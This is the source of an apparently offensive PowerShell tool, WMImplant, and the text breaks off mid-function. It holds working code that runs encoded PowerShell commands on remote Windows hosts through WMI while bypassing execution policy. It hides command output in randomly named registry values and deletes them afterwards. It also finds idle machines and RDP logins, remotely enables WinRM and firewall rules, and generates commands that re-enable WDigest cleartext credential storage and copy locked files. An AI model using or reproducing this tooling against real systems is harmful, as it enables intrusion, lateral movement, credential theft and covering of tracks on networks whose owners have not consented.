#requires -version 2

<#
    WMImplant v1.0
    License: GPLv3
    Author: @ChrisTruncer and @evan_pena2003
#>

function Disable-WinRMWMI
{
    # This and the coupled enable function are no longer actually used, but are included in the event
    # I find a specific usecase for this route in the future
    param
    (
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Creds,
        [Parameter(Mandatory = $False)]
        [string]$Target
    )

    Begin
    {
        $HKLM = 2147483650
        $Key = 'SOFTWARE\Policies\Microsoft\Windows\WinRM\Service'
        $DWORDName = 'AllowAutoConfig' 
        $DWORDvalue = '0x1'
    }

    Process
    {
        if(!$Target)
        {
            $Target = Read-Host "What system are you targeting? >"
            $Target = $Target.Trim()
        }

        Write-Verbose 'Attempting to create Remote Key and set value'
        if($Creds)
        {
            Invoke-WmiMethod -Class StdRegProv -Name DeleteKey -ArgumentList $HKLM, $Key -ComputerName $Target -Credential $Creds
        }
        else 
        {
            Invoke-WmiMethod -Class StdRegProv -Name DeleteKey -ArgumentList $HKLM, $Key -ComputerName $Target
        }

        Write-Verbose 'Attempting to stop WinRM'
        (Get-WmiObject win32_service -Filter "Name='WinRM'" -ComputerName $Target).StopService() | Out-Null
        Start-Sleep -Seconds 10

        # Variables for WinRM Firewall Rule
        $Key = 'SOFTWARE\Policies\Microsoft\WindowsFirewall\FirewallRules'
        $Rule1Value = 'v2.20|Action=Allow|Active=TRUE|Dir=In|Protocol=6|Profile=Public|LPort=5985|RA4=LocalSubnet|RA6=LocalSubnet|App=System|Name=@FirewallAPI.dll,-30253|Desc=@FirewallAPI.dll,-30256|EmbedCtxt=@FirewallAPI.dll,-30267|'
        $Rule1Name = 'WINRM-HTTP-In-TCP-PUBLIC'
        $Rule2Value = 'v2.20|Action=Allow|Active=TRUE|Dir=In|Protocol=6|Profile=Domain|Profile=Private|LPort=5985|App=System|Name=@FirewallAPI.dll,-30253|Desc=@FirewallAPI.dll,-30256|EmbedCtxt=@FirewallAPI.dll,-30267|'
        $Rule2Name = 'WINRM-HTTP-In-TCP'

        if($Creds)
        {
            Invoke-WmiMethod -Class StdRegProv -Name DeleteKey -ArgumentList $HKLM, $Key -ComputerName $Target -Credential $Creds
        }
        else 
        {
            Invoke-WmiMethod -Class StdRegProv -Name DeleteKey -ArgumentList $HKLM, $Key -ComputerName $Target
        }        
    }
}

function Enable-WinRMWMI
{
    # This and the coupled disable function are no longer actually used, but are included in the event
    # I find a specific usecase for this route in the future
    param
    (
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Creds,
        [Parameter(Mandatory = $False)]
        [string]$Target
    )

    Begin
    {
        $HKLM = 2147483650
        $Key = 'SOFTWARE\Policies\Microsoft\Windows\WinRM\Service'
        $DWORDName = 'AllowAutoConfig' 
        $DWORDvalue = '0x1'
    }

    Process
    {
        if(!$Target)
        {
            $Target = Read-Host "What system are you targeting? >"
            $Target = $Target.Trim()
        }

        # This code was found online as separate functions and combined into a single
        # function where appropriate
        # Enabling WinRM Service
        Write-Verbose 'Attempting to create Remote Key and set value'
        if($Creds)
        {
            Invoke-WmiMethod -Class StdRegProv -Name CreateKey -ArgumentList $HKLM, $Key -ComputerName $Target -Credential $Creds
            Invoke-RegValueMod -RegMethod create -RegHive hklm -RegKey $Key -RegValue $DWORDName -RegData 1 -Target $Target -Creds $Creds
        }
        else 
        {
            Invoke-WmiMethod -Class StdRegProv -Name CreateKey -ArgumentList $HKLM, $Key -ComputerName $Target
            Invoke-RegValueMod -RegMethod create -RegHive hklm -RegKey $Key -RegValue $DWORDName -RegData 1 -Target $Target
        }

        Write-Verbose 'Attempting to start WinRM'
        (Get-WmiObject win32_service -Filter "Name='WinRM'" -ComputerName $Target).StartService() | Out-Null
        Start-Sleep -Seconds 10

        # Variables for WinRM Firewall Rule
        $Key = 'SOFTWARE\Policies\Microsoft\WindowsFirewall\FirewallRules'
        $Rule1Value = 'v2.20|Action=Allow|Active=TRUE|Dir=In|Protocol=6|Profile=Public|LPort=5985|RA4=LocalSubnet|RA6=LocalSubnet|App=System|Name=@FirewallAPI.dll,-30253|Desc=@FirewallAPI.dll,-30256|EmbedCtxt=@FirewallAPI.dll,-30267|'
        $Rule1Name = 'WINRM-HTTP-In-TCP-PUBLIC'
        $Rule2Value = 'v2.20|Action=Allow|Active=TRUE|Dir=In|Protocol=6|Profile=Domain|Profile=Private|LPort=5985|App=System|Name=@FirewallAPI.dll,-30253|Desc=@FirewallAPI.dll,-30256|EmbedCtxt=@FirewallAPI.dll,-30267|'
        $Rule2Name = 'WINRM-HTTP-In-TCP'

        if($Creds)
        {
            Invoke-WmiMethod -Class StdRegProv -Name CreateKey -ArgumentList $HKLM, $Key -ComputerName $Target -Credential $Creds
            Invoke-RegValueMod -RegMethod create -RegHive hklm -RegKey $Key -RegValue $Rule1Name -RegData $Rule1Value -Target $Target -Creds $Creds
            Invoke-RegValueMod -RegMethod create -RegHive hklm -RegKey $Key -RegValue $Rule2Name -RegData $Rule2Value -Target $Target -Creds $Creds
        }
        else 
        {
            Invoke-WmiMethod -Class StdRegProv -Name CreateKey -ArgumentList $HKLM, $Key -ComputerName $Target
            Invoke-RegValueMod -RegMethod create -RegHive hklm -RegKey $Key -RegValue $Rule1Name -RegData $Rule1Value -Target $Target
            Invoke-RegValueMod -RegMethod create -RegHive hklm -RegKey $Key -RegValue $Rule2Name -RegData $Rule2Value -Target $Target
        }

        # Restarting firewall service
        Write-Verbose 'Attempting to stop MpsSvc'
        (Get-WmiObject win32_service -Filter "Name='MpsSvc'" -ComputerName $Target).StopService() | Out-Null
        Start-Sleep -Seconds 10
        Write-Verbose 'Attempting to start MpsSvc'
        (Get-WmiObject win32_service -Filter "Name='MpsSvc'" -ComputerName $Target).StartService() | Out-Null
        Start-Sleep -Seconds 10
    }
}

function Find-CurrentUsers
{
    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Creds,
        [Parameter(Mandatory = $False)]
        [string]$Target
    )

    Process
    {
        if(!$Target)
        {
            $Target = Read-Host "What system are you targeting? >"
            $Target = $Target.Trim()
        }

        Write-Verbose "Connecting to $Target"

        if($Creds)
        {
            $system_process_accounts = Get-WMIObject Win32_Process -Credential $Creds -ComputerName $Target | ForEach { $owner = $_.GetOwner(); '{0}\{1}' -f $owner.Domain, $owner.User } | Sort-Object | Get-Unique
        }
        else
        {
            $system_process_accounts = Get-WMIObject Win32_Process -ComputerName $Target | ForEach { $owner = $_.GetOwner(); '{0}\{1}' -f $owner.Domain, $owner.User } | Sort-Object | Get-Unique
        }

        foreach($user_name in $system_process_accounts) 
        { 
            if((!($user_name -Like "*NT AUTHORITY*")) -and ($user_name -ne '\')) 
            { 
                $user_name
            }
        }
    }
}

function Find-VacantComputer
{
    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Creds,
        [Parameter(Mandatory = $False)]
        [string]$Target
    )

    Process
    {
        if(!$Target)
        {
            $Target = Read-Host "What system are you targeting? >"
            $Target = $Target.Trim()
        }

        # Need to add in filtering here to stop if a "true" has been found for screensavers being active
        Write-Verbose "Connecting to $Target"
        
        Write-Verbose "Checking for active screensaver or logon screen processes"
        if($Creds)
        {
            $all_processes = Get-ProcessListingWMImplant -Creds $Creds -Target $Target
        }
        else
        {
            $all_processes = Get-ProcessListingWMImplant -Target $Target
        }

        $ScreenshotActive = $all_processes | Select-String ".scr"
        $LoginPrompt = $all_processes | Select-String "LogonUI.exe"

        # If either returned true, we can assume the user is not active at their desktop
        if ($ScreenshotActive -or $LoginPrompt)
        {
            Write-Output "Screensaver or Logon screen is active on $Target!"
        }
        else
        {
            Write-Output "User is at present at $Target!"
        }

        try
        {
            $user = $null
            if($Creds)
            {
                $user = Get-WmiObject -Class win32_computersystem -ComputerName $Target -Credential $Creds -ErrorAction Stop | select -ExpandProperty username
            }
            else
            {
                $user = Get-WmiObject -Class win32_computersystem -ComputerName $Target -ErrorAction Stop | select -ExpandProperty username
            }
        }
        catch
        { 
            $message = $_.Exception.Message
            if($message -like '*not process argument because*')
            {
                Write-Output "No users appear active on $Target"
            }
            elseif($message -like '*RPC server is unavailable*')
            {
                Write-Verbose "Cannot connect to $Target"
            }
        }
    }
}

function Get-ComputerDrives
{
    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Creds,
        [Parameter(Mandatory = $False)]
        [string]$Target
    )

    Process
    {
        if(!$Target)
        {
            $Target = Read-Host "What system are you targeting? >"
            $Target = $Target.Trim()
        }

        $filter = "DriveType = '4' OR DriveType = '3'"

        if($Creds)
        {
            Get-WmiObject -class win32_logicaldisk -ComputerName $Target -Filter $filter -Credential $Creds
        }

        else
        {
            Get-WmiObject -class win32_logicaldisk -ComputerName $Target -Filter $filter
        }
    }
    end{}
}

function Get-HostInfo
{
    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Creds,
        [Parameter(Mandatory = $False)]
        [string]$Target
    )

    Process
    {
        if(!$Target)
        {
            $Target = Read-Host "What system are you targeting? >"
            $Target = $Target.Trim()
        }

        if($Creds)
        {
            try
            {
                $sys_info = Get-WmiObject -class win32_computersystem -ComputerName $Target -Credential $Creds -ErrorAction Stop
            }
            catch
            {
                Continue
            }
        }

        else
        {
            try
            {
                $sys_info = Get-WmiObject -class win32_computersystem -ComputerName $Target -ErrorAction Stop
            }
            catch
            {
                Continue
            }
        }

        if($sys_info.Name)
        {
            $sys_info
        }
    }
    end{}
}

function Get-InstalledPrograms
{
    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Creds,
        [Parameter(Mandatory = $False)]
        [string]$Target
    )

    Process
    {
        $fullregistrypath = "HKLM:\Software\Microsoft\Windows"
        $registrydownname = -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
        # The reghive value is for hkey_local_machine
        $reghive = 2147483650
        $regpath = "SOFTWARE\Microsoft\Windows"
        $SystemHostname = Get-WMIObject Win32_ComputerSystem | Select-Object -ExpandProperty name

        if(!$Target)
        {
            $Target = Read-Host "What system are you targeting? >"
            $Target = $Target.Trim()
        }

        # On remote system, save file to registry
        Write-Verbose "Running remote command and writing on remote registry"
        $remote_command = '$fct = Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | format-list | out-string; $bytes = [System.Text.Encoding]::Ascii.GetBytes($fct); $fctenc=[Convert]::ToBase64String($bytes); New-ItemProperty -Path ' + "'$fullregistrypath'" + ' -Name ' + "'$registrydownname'" + ' -Value $fctenc -PropertyType String -Force'
        $remote_command = 'powershell -nop -exec bypass -c "' + $remote_command + '"'

        if($Creds)
        {
            Invoke-WmiMethod -class win32_process -Name Create -Argumentlist $remote_command -Credential $Creds -ComputerName $Target
        }
        else
        {
            Invoke-WmiMethod -class win32_process -Name Create -Argumentlist $remote_command -ComputerName $Target
        }

        Write-Verbose "Sleeping to let remote system store the information"
        Start-Sleep -s 15

        # Grab file from remote system's registry
        Write-Verbose "Reading info from remote registry"

        if($Creds)
        {
            $remote_reg = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $reghive, $regpath, $registrydownname -ComputerName $Target -Credential $Creds
        }
        else
        {
            $remote_reg = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $reghive, $regpath, $registrydownname -ComputerName $Target
        }
    
        $decode = [System.Convert]::FromBase64String($remote_reg.sValue)
        # Print to console
        $enc = [System.Text.Encoding]::ASCII
        $enc.GetString($decode)

        # Removing Registry value from remote system
        Write-Verbose "Removing registry value from remote system"

        if($Creds)
        {
            Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $reghive, $regpath, $registrydownname -ComputerName $Target -Credential $Creds
        }
        else
        {
            Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $reghive, $regpath, $registrydownname -ComputerName $Target
        }
        Write-Verbose "Done!"
    }
    end{}
}

function Get-NetworkCards
{
    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Creds,
        [Parameter(Mandatory = $False)]
        [string]$Target
    )

    Process
    {
        if(!$Target)
        {
            $Target = Read-Host "What system are you targeting? >"
            $Target = $Target.Trim()
        }

        if($Creds)
        {
            $adapters = Get-WmiObject -class win32_networkadapterconfiguration -ComputerName $Target -Credential $Creds
        }
        else
        {
            $adapters = Get-WmiObject -class win32_networkadapterconfiguration -ComputerName $Target
        }

        foreach($nic in $adapters)
        {
            if($nic.IPAddress -ne $null)
            {
                $nic
            }
        }
    }
    end{}
}

function Get-ProcessListingWMImplant
{
    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Creds,
        [Parameter(Mandatory = $False)] 
        [string]$Target
    )

    Process
    {
        if(!$Target)
        {
            $Target = Read-Host "What system are you targeting? >"
            $Target = $Target.Trim()
        }

        Write-Verbose "Connecting to $Target"

        if($Creds)
        {
            Get-WMIObject Win32_Process -Credential $Creds -ComputerName $Target | ForEach-Object { $_.ProcessName } | Sort-Object | Get-Unique
        }
        else
        {
            Get-WMIObject Win32_Process -ComputerName $Target | ForEach-Object { $_.ProcessName } | Sort-Object | Get-Unique
        }
    }
}

function Get-WMIEventLogins
{
<#
.DESCRIPTION
Will get remote login details from event log on remote hosts.
This can be used to find out where people are logging in from or
to find jump boxes.

.PARAMETER Targets
List of targets. Will accept value from pipe.

.PARAMETER User
Username to connect to remote host

.PARAMETER Pass
Password to connect to remote host

.PARAMETER FileName
Path to save output to
#>
    
    Param
    (
        # Parameter Assignment
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Creds,
        [Parameter(Mandatory = $False)]
        [string]$Target,
        [Parameter(Mandatory = $False)]
        [string]$FileName
    )

    Process {

        if(!$Target)
        {
            $Target = Read-Host "What system are you targeting? >"
            $Target = $Target.Trim()
        }

        Write-Verbose "Connecting to $Target"

        if($Creds)
        {
            $temp = Get-WmiObject -Credential $Creds -computername $Target -query "SELECT * FROM Win32_NTLogEvent WHERE (logfile='security') AND (EventCode='4624')" | where { $_.Message | Select-String "Logon Type:\s+10" | Select-String "Logon Process:\s+User32"}
        }

        else
        {
            $temp = Get-WmiObject -computername $Target -query "SELECT * FROM Win32_NTLogEvent WHERE (logfile='security') AND (EventCode='4624')" | where { $_.Message | Select-String "Logon Type:\s+10" | Select-String "Logon Process:\s+User32"}
        }

        $temp2 = @()
        ForEach ($line in $temp)
        {
            $temp2 = $line.Message -split '[\r\n]' | Select-String -pattern "workstation name:", "account name:", "source network address:"
        }

        $result = $temp2 | Select-String -pattern "workstation name:", "account name:", "source network address:"; 

        $finalResult = @(); 
        For($i=0; $i -lt $result.Count; $i+=4) { 
            $accountName = ([string]($result[$i+1])).Split(":")[1].Trim(); 
            $workstationName = ([string]($result[$i+2])).Split(":")[1].Trim(); 
            $sourceAddress = ([string]($result[$i+3])).Split(":")[1].Trim(); 
            $keyPair = "$accountName,$workstationName,$sourceAddress"; 
            $finalResult += $keyPair 
        }
        Write-Output "User Account, System Connecting To, System Connecting From"
        $finalResult | Sort-Object -Unique

        if($FileName)
        {
            $temp | Out-File -Encoding ASCII -FilePath $FileName
        }
    }
}

function Invoke-CommandExecution
{
    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Creds,
        [Parameter(Mandatory = $False)]
        [string]$Target,
        [Parameter(Mandatory = $False)]
        [string]$ExecCommand
    )

    Process
    {
        if(!$Target)
        {
            $Target = Read-Host "What system are you targeting? >"
            $Target = $Target.Trim()
        }

        if(!$ExecCommand)
        {
            $ExecCommand = Read-Host "Please provide the command you'd like to run >"
        }

        # setting variables for registry storage
        #hklm = 2147483650
        #hkcu = 2147483649
        #hkcr = 2147483648
        #hkusers = 2147483651
        #hkcurrentconfig = 2147483653
        $fullregistrypath = "HKLM:\Software\Microsoft\Windows"
        $registrydownname = -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
        # The reghive value is for hkey_local_machine
        $reghive = 2147483650
        $regpath = "SOFTWARE\Microsoft\Windows"
        $SystemHostname = Get-WMIObject Win32_ComputerSystem | Select-Object -ExpandProperty name

        Write-Verbose "Building PowerShell command"

        $encoded_command = '$output = '
        $encoded_command += "$ExecCommand;"
        $encoded_command += ' $bytes = [System.Text.Encoding]::Ascii.GetBytes($output); $EncodedText = [Convert]::ToBase64String($bytes);'
        $encoded_command += ' New-ItemProperty -Path ' + "'$fullregistrypath'" + ' -Name ' + "'$registrydownname'" + ' -Value $EncodedText -PropertyType String -Force'
        $encoded_command = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($encoded_command))

        $Command = 'powershell -nop -exec bypass -enc "'
        $Command += "$encoded_command"
        $Command += '"'

        Write-Verbose "Running command on remote system..."

        if($Creds)
        {
            $dummyvalue = Invoke-WmiMethod -class win32_process -name create -Argumentlist $Command -Credential $Creds -ComputerName $Target
        }
        else
        {
            $dummyvalue = Invoke-WmiMethod -class win32_process -name create -Argumentlist $Command -ComputerName $Target
        }

        # Grab file from remote system's registry
        Write-Verbose "Sleeping, and then reading file from remote registry"
        Start-Sleep -s 30

        if($Creds)
        {   
            $remote_reg = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $reghive, $regpath, $registrydownname -ComputerName $Target -Credential $Creds
        }
        else
        {
            $remote_reg = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $reghive, $regpath, $registrydownname -ComputerName $Target
        }

        $decode = [System.Convert]::FromBase64String($remote_reg.sValue)
        # Print to console
        $enc = [System.Text.Encoding]::ASCII
        $enc.GetString($decode)

        # Removing Registry value from remote system
        Write-Verbose "Removing registry value from remote system"

        if($Creds)
        {
            $dummyvalue = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $reghive, $regpath, $registrydownname -ComputerName $Target -Credential $Creds
        }
        else
        {
            $dummyvalue = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $reghive, $regpath, $registrydownname -ComputerName $Target
        }

        Write-Verbose "Done!"
    }
}

function Invoke-CommandGeneration
{
    Show-WMImplantMainMenu

    # Read in user's menu choice
    $GenSelection = Read-Host "What is the command you'd like to run? >"
    $GenSelection = $GenSelection.Trim().ToLower()

    $GenTarget = Read-Host "What system are you targeting? >"
    $GenTarget = $GenTarget.Trim()

    $AnyCreds = Read-Host "Do you want to run this in the context of a different user? [yes] or [no]? >"
    $AnyCreds = $AnyCreds.Trim().ToLower()

    if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
    {
        # Query user for user account and password to use
        $GenUsername = Read-Host "Please provide the domain\username to use for authentication >"
        $GenPassword = Read-Host "Please provide the password to use for authentication >"
    }

    switch ($GenSelection)
    {
        "change_user"
        {
            Throw "This really isn't applicable unless you are using WMImplant interactively."
        }

        "exit"
        {
            Throw "This command isn't applicable unless using WMImplant interactively"
        }

        "gen_cli"
        {
            Throw "You are already generating a command!"
        }

        "help"
        {
            Throw "You are already looking at the help menu!"
        }

        "cat"
        {
            $FileRead = Read-Host "What's the full path to the file you'd like to read? >"

            if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
            {
                $Command = "`nInvoke-WMImplant -command cat -Target $GenTarget -RemoteFile $FileRead -RemoteUser $GenUsername -RemotePass $GenPassword`n"
                $Command
            }

            else
            {
                $Command = "`nInvoke-WMImplant -command cat -Target $GenTarget -RemoteFile $FileRead`n"
                $Command
            }
        }

        "dg_download"
        {
            # Determine which file you want to download, and where to save it
            $GenDownload = Read-Host "What is the full path to the file you want to download? >"
            $GenSavePath = Read-Host "What is the full path to where you'd like to save the file? >"

            if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
            {
                $Command = "`nInvoke-WMImplant -command dg_download -RemoteFile $GenDownload -LocalFile $GenSavePath -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
                $Command
            }

            else
            {
                $Command = "`nInvoke-WMImplant -command dg_download -RemoteFile $GenDownload -LocalFile $GenSavePath -Target $GenTarget`n"
                $Command
            }
        }

        "dg_upload"
        {
            $LocalUserUpload = Read-Host "Please provide the local user account for connecting back over WMI >"
            $LocalUserUpload = $LocalUserUpload.Trim().ToLower()
            $LocalPassUpload = Read-Host "Please provide the password associated with the account >"

            $FileToUpload = Read-Host "Please provide the full path to the local file you want to upload >"
            $UploadLocation = Read-Host "Please provide the full path to the location you'd like to upload the file >"

            if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
            {
                $Command = "`nInvoke-WMImplant -command dg_upload -LocalUser $LocalUserUpload -LocalPass $LocalPassUpload -LocalFile $FileToUpload -RemoteFile $UploadLocation -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
                $Command
            }

            else
            {
                $Command = "`nInvoke-WMImplant -command dg_upload -LocalUser $LocalUserUpload -LocalPass $LocalPassUpload -LocalFile $FileToUpload -RemoteFile $UploadLocation -Target $GenTarget`n"
                $Command
            }
        }

        "download"
        {
            # Determine which file you want to download, and where to save it
            $GenDownload = Read-Host "What is the full path to the file you want to download? >"
            $GenSavePath = Read-Host "What is the full path to where you'd like to save the file? >"

            if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
            {
                $Command = "`nInvoke-WMImplant -command download -RemoteFile $GenDownload -LocalFile $GenSavePath -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
                $Command
            }

            else
            {
                $Command = "`nInvoke-WMImplant -command download -RemoteFile $GenDownload -LocalFile $GenSavePath -Target $GenTarget`n"
                $Command
            }
        }

        "ls"
        {
            $DirLs = Read-Host "What is the full path to the directory you want to list? >"

            if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
            {
                $Command = "`nInvoke-WMImplant -command ls -RemoteFile $DirLs -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
                $Command
            }

            else
            {
                $Command = "`nInvoke-WMImplant -command ls -RemoteFile $DirLs -Target $GenTarget`n"
                $Command
            }
        }

        "ninjacopy"
        {
            $FileToCopy = Read-Host "What is the full path to the file you'd like to copy? >"
            $CopyLocation = Read-Host "What is the full path to where you'd like the file copied to? >"
            $FullCommand = '"Invoke-NinjaCopy -Path '
            $FullCommand += "$FileToCopy "
            $FullCommand += '-RemoteDestination '
            $FullCommand += "$CopyLocation"
            $FullCommand +='"'
            if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
            {
                $Command = "`nInvoke-WMImplant -command ninjacopy -RemoteFile $FileToCopy -LocalFile $CopyLocation -RemoteUser $GenUserName -RemotePass $GenPassword -Target $GenTarget`n"
                $Command
            }

            else
            {
                $Command = "`nInvoke-WMImplant -command ninjacopy -RemoteFile $FileToCopy -LocalFile $CopyLocation -Target $GenTarget`n"
                $Command
            }
        }

        "search"
        {
            $SearchBy = Read-Host "Do you want to search for a file [extension] or [name]? >"
            $SearchBy = $SearchBy.Trim().ToLower()
            $SearchDrive = Read-Host "What drive do you want to search? Ex C: >"
            $SearchDrive = $SearchDrive.Trim().ToLower()

            if($SearchBy -eq "extension")
            {
                $SearchExt = Read-Host "What is the file extension you are looking for? >"
                $SearchExt = $SearchExt.Trim().ToLower()

                if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
                {
                    $Command = "`nInvoke-WMImplant -command search -RemoteExtension $SearchExt -RemoteDrive $SearchDrive -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
                    $Command
                }

                else
                {
                    $Command = "`nInvoke-WMImplant -command search -RemoteExtension $SearchExt -RemoteDrive $SearchDrive -Target $GenTarget`n"
                    $Command
                }
            }
            else
            {
                $SearchFile = Read-Host "What is the file name you are looking for? >"
                $SearchFile = $SearchFile.Trim().ToLower()

                if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
                {
                    $Command = "`nInvoke-WMImplant -command search -RemoteFile $SearchFile -RemoteDrive $SearchDrive -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
                    $Command
                }

                else
                {
                    $Command = "`nInvoke-WMImplant -command search -RemoteFile $SearchFile -RemoteDrive $SearchDrive -Target $GenTarget`n"
                    $Command
                }
            }
        }

        "upload"
        {
            $LocalUserUpload = Read-Host "Please provide the local user account for connecting back over WMI >"
            $LocalUserUpload = $LocalUserUpload.Trim().ToLower()
            $LocalPassUpload = Read-Host "Please provide the password associated with the account >"

            $FileToUpload = Read-Host "Please provide the full path to the local file you want to upload >"
            $UploadLocation = Read-Host "Please provide the full path to the location you'd like to upload the file >"

            if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
            {
                $Command = "`nInvoke-WMImplant -command upload -LocalUser $LocalUserUpload -LocalPass $LocalPassUpload -LocalFile $FileToUpload -RemoteFile $UploadLocation -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
                $Command
            }

            else
            {
                $Command = "`nInvoke-WMImplant -command upload -LocalUser $LocalUserUpload -LocalPass $LocalPassUpload -LocalFile $FileToUpload -RemoteFile $UploadLocation -Target $GenTarget`n"
                $Command
            }
        }

        "command_exec"
        {
            $GenCommandExec = Read-Host "What command do you want to run on the remote system? >"
            if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
            {
                $Command = "`nInvoke-WMImplant -command command_exec -RemoteCommand $GenCommandExec -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
                $Command
            }
            else
            {
                $Command = "`nInvoke-WMImplant -command command_exec -RemoteCommand $GenCommandExec -Target $GenTarget`n"
                $Command
            }
        }

        "disable_wdigest"
        {
            if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
            {
                $Command = "`nInvoke-WMImplant -command registry_mod -RegMethod delete -RegHive 'hklm' -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegValue 'UseLogonCredential' -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
                $Command
            }
            else
            {
                $Command = "`nInvoke-WMImplant -command registry_mod -RegMethod delete -RegHive 'hklm' -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegValue 'UseLogonCredential' -Target $GenTarget`n"
                $Command
            }
        }

        "disable_winrm"
        {
            if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
            {
                $Command = "`nInvoke-WMImplant -command disable_winrm -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
                $Command
            }
            else
            {
                $Command = "`nInvoke-WMImplant -command disable_winrm -Target $GenTarget`n"
                $Command
            }
        }

        "enable_wdigest"
        {
            if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
            {
                $Command = "`nInvoke-WMImplant -command registry_mod -RegMethod create -RegHive 'hklm' -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegValue 'UseLogonCredential' -RegData '1' -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
                $Command
            }
            else
            {
                $Command = "`nInvoke-WMImplant -command registry_mod -RegMethod create -RegHive 'hklm' -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegValue 'UseLogonCredential' -RegData '1' -Target $GenTarget`n"
                $Command
            }
        }

        "enable_winrm"
        {
            if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
            {
                $Command = "`nInvoke-WMImplant -command enable_winrm -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
                $Command
            }
            else
            {
                $Command = "`nInvoke-WMImplant -command enable_winrm -Target $GenTarget`n"
                $Command
            }
        }

        "registry_mod"
        {
            $GenRegMethod = Read-Host "Do you want to [create] or [delete] a string registry value? >"
            $GenRegMethod = $GenRegMethod.Trim().ToLower()
            $GenRegHive = Read-Host "What hive would you like to modify, [hklm] or [hkcu]? >"
            $GenRegKey = Read-Host "What's the registry key you'd like to modify? Ex: SOFTWARE\Microsoft\Windows >"
            $GenRegValue = Read-Host "What's the registry value you'd like to modify? Ex: WMImplantInstalled >"

            switch($GenRegMethod)
            {
                "create"
                {
                    $GenRegData = Read-Host "What's the data you'd like to modify? >"
                    if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
                    {
                        $Command = "`nInvoke-WMImplant -command registry_mod -RegMethod create -RegHive $GenRegHive -RegKey $GenRegKey -RegValue $GenRegValue -RegData $GenRegData -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
                        $Command
                    }
                    else
                    {
                        $Command = "`nInvoke-WMImplant -command registry_mod -RegMethod create -RegHive $GenRegHive -RegKey $GenRegKey -RegValue $GenRegValue -RegData $GenRegData -Target $GenTarget`n"
                        $Command
                    }
                }

                "delete"
                {
                    if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
                    {
                        $Command = "`nInvoke-WMImplant -command registry_mod -RegMethod delete -RegHive $GenRegHive -RegKey $GenRegKey -RegValue $GenRegValue -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
                        $Command
                    }
                    else
                    {
                        $Command = "`nInvoke-WMImplant -command registry_mod -RegMethod delete -RegHive $GenRegHive -RegKey $GenRegKey -RegValue $GenRegValue -Target $GenTarget`n"
                        $Command
                    }
                }
            }

        }

        "remote_posh"
        {
